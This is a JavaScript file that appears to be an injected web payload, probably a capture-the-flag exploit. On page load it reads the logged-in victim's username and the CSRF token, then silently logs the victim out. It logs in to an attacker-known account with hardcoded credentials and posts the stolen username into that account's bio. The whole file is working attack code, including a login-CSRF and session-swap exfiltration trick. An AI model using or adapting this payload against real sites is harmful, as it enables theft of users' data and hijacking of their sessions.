function fetch(url) {
    return new Promise((resolve, reject) => {
        var xhr = new XMLHttpRequest();
        xhr.open('get', url, true);
        xhr.responseType = 'document';
        xhr.withCredentials = true;
        xhr.onload = () => {
            if (xhr.status == 200) {
                resolve(xhr.response.documentElement.innerHTML);
            } else {
                reject(xhr.status);
            }
        };

        xhr.send();

    });
}

function post(url, obj) {
    return new Promise((resolve, reject) => {
        var xhr = new XMLHttpRequest();
        xhr.open('post', url, true);
        XMLHttpRequest.withCredentials = true;
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onload = () => {
            if (xhr.status == 200) {
                resolve(xhr.response);
            } else {
                reject(xhr.status);
            }
        }

        // format the data
        var data = "";
        for (const [key, value] of Object.entries(obj)) {
            data += encodeURI(key) + "=" + encodeURI(value) + "&";
        }

        xhr.send(data);
    });
}

document.addEventListener("DOMContentLoaded", async e => {
    // Fetch username
    var parser = new window.DOMParser();
    var home_html = await fetch("/");
    var home = parser.parseFromString(home_html, 'text/html');
    var title = home.getElementsByTagName("h1")[0].innerText;
    const re_username = /([a-zA-Z0-9]+)'s/
    var username = re_username.exec(title)[1];

    // we need to fetch the csrf token 
    csrf_token = document.getElementById("csrf_token").value;
    // disconnect the user
    // POST /api/user/logout
    await post("/api/user/logout", { csrf_token: csrf_token });

    // connect with a know username
    // POST /api/user/login username password
    home_html = await fetch("/");
    home = parser.parseFromString(home_html, 'text/html');
    csrf_token = home.getElementById("csrf_token").value;

    await post("/api/user/login", { username: "testtest", password: "testtest", csrf_token: csrf_token });

    // publish the data
    // POST /api/user/update bio
    home_html = await fetch("/");
    home = parser.parseFromString(home_html, 'text/html');
    csrf_token = home.getElementById("csrf_token").value;

    await post("/api/user/update", { bio: username, csrf_token: csrf_token });
}, false);